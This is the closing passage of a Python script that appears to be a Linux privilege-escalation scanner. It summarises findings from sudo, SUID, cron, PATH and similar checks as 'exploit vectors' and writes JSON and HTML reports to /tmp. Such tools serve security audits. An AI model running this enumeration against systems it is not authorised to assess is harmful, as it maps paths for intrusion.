    enum_sudo()
    enum_suid()
    enum_capabilities()
    enum_cron()
    enum_path()
    enum_writable()
    enum_network()

    # ── Summary ──
    section("SCAN SUMMARY")
    criticals = [f for f in report["findings"] if f["level"] == "CRITICAL"]
    highs     = [f for f in report["findings"] if f["level"] == "HIGH"]

    print(f"\n  {BOLD}Total findings : {len(report['findings'])}{RESET}")
    print(f"  {RED}Critical       : {len(criticals)}{RESET}")
    print(f"  {YELLOW}High           : {len(highs)}{RESET}")

    if criticals:
        print(f"\n  {RED}{BOLD}⚡ Top exploit vectors:{RESET}")
        for f in criticals[:5]:
            print(f"    • [{f['category']}] {f['message']}")

    # ── JSON report ──
    hostname  = run("hostname")
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    json_path = f"/tmp/privesc_{hostname}_{timestamp}.json"
    with open(json_path, "w") as jf:
        json.dump(report, jf, indent=2)
    print(f"\n  {GREEN}[✓] JSON report: {json_path}{RESET}")

    # ── HTML report ──
    if not args.json_only:
        html_path = args.output if args.output else f"/tmp/privesc_{hostname}_{timestamp}.html"
        generate_html_report(html_path)
        print(f"  {CYAN}View report: python3 -m http.server 8080 --directory /tmp{RESET}")

    print()


if __name__ == "__main__":
    main()
